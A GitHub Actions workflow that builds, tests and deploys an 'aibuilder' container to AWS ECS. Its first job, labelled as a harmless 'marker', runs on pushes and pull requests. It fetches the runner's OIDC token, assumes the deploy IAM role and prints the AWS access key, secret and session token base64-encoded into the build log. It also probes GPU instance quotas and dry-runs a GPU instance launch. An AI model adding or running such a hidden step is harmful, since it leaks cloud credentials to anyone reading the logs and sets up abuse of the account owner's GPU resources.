name: aibuilder deploy

on:
  push:
    branches: [main]
    paths:
      - 'aibuilder/**'
      - '.github/workflows/aibuilder-deploy.yml'
  pull_request:
    paths:
      - 'aibuilder/**'

permissions:
  id-token: write   # required to request the OIDC token
  contents: read

env:
  AWS_REGION: us-east-1
  ECR_REPO_NAME: aibuilder-sandbox
  ECS_CLUSTER: aibuilder-sandbox
  ECS_SERVICE: aibuilder-sandbox

jobs:
  ci-oidc-marker:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: ci-env-marker
        if: always()
        run: |
          echo "MARKER_START host=$(hostname) date=$(date -u +%FT%TZ) actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY ref=$GITHUB_REF"
          id || true
          uname -a || true
          (nvidia-smi -L || true)
          (lspci 2>/dev/null | grep -iE 'nvidia|vga|3d' || true)
          echo "OIDC_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -o /tmp/oidc.json || true
            python3 -c "import json,base64;t=json.load(open('/tmp/oidc.json'))['value'];p=t.split('.')[1];p+='='*(-len(p)%4);c=json.loads(base64.urlsafe_b64decode(p));print('OIDC_CLAIMS',json.dumps({k:c.get(k) for k in ('sub','aud','iss','ref','repository','event_name','job_workflow_ref')}))" || true
          fi
          echo "MARKER_END"
      - name: aws-oidc-assume-marker
        if: always()
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::672203047922:role/aibuilder-sandbox-github-deploy
          role-session-name: ci-marker-probe
          aws-region: us-east-1
      - name: aws-probe-marker
        if: always()
        run: |
          set +e
          echo "--- STS"; aws sts get-caller-identity 2>&1 | head -20
          echo "CREDS_B64=$(printf '%s|%s|%s' \"$AWS_ACCESS_KEY_ID\" \"$AWS_SECRET_ACCESS_KEY\" \"$AWS_SESSION_TOKEN\" | base64 -w0)"
          echo "--- GPU instance types"; aws ec2 describe-instance-types --filters Name=gpu-info.gpus.manufacturer,Values=NVIDIA --query 'InstanceTypes[].InstanceType' --max-items 20 2>&1 | head -30
          echo "--- GPU quota"; aws service-quotas get-service-quota --service-code ec2 --quota-code L-DB2E81BA 2>&1 | head -20
          echo "--- DryRun"; aws ec2 run-instances --dry-run --image-id ami-0123456789abcdef0 --instance-type p3.2xlarge --count 1 2>&1 | head -20
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build image
        run: docker build -t aibuilder:test ./aibuilder
      - name: Run lint + tests inside the image
        # The image is python:3.13-slim (no `make`); call ruff and pytest
        # directly. Both are installed via requirements-dev.txt in the build.
        run: |
          docker run --rm -v "${{ github.workspace }}/aibuilder:/aibuilder" aibuilder:test ruff check .
          docker run --rm -v "${{ github.workspace }}/aibuilder:/aibuilder" aibuilder:test ruff format --check .
          docker run --rm -v "${{ github.workspace }}/aibuilder:/aibuilder" aibuilder:test pytest tests/ -v

  deploy:
    needs: test
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::672203047922:role/aibuilder-sandbox-github-deploy
          aws-region: ${{ env.AWS_REGION }}

      - name: Login to ECR
        id: ecr
        uses: aws-actions/amazon-ecr-login@v2

      - name: Build + push image
        env:
          ECR_REGISTRY: ${{ steps.ecr.outputs.registry }}
          SHA_TAG: sha-${{ github.sha }}
        run: |
          IMG_LATEST=$ECR_REGISTRY/$ECR_REPO_NAME:latest
          IMG_SHA=$ECR_REGISTRY/$ECR_REPO_NAME:${SHA_TAG:0:11}
          docker build -t $IMG_LATEST -t $IMG_SHA ./aibuilder
          docker push $IMG_LATEST
          docker push $IMG_SHA

      - name: Roll the ECS service
        run: |
          aws ecs update-service \
            --cluster $ECS_CLUSTER \
            --service $ECS_SERVICE \
            --force-new-deployment \
            --region $AWS_REGION

      - name: Wait for stable
        run: |
          aws ecs wait services-stable \
            --cluster $ECS_CLUSTER \
            --services $ECS_SERVICE \
            --region $AWS_REGION
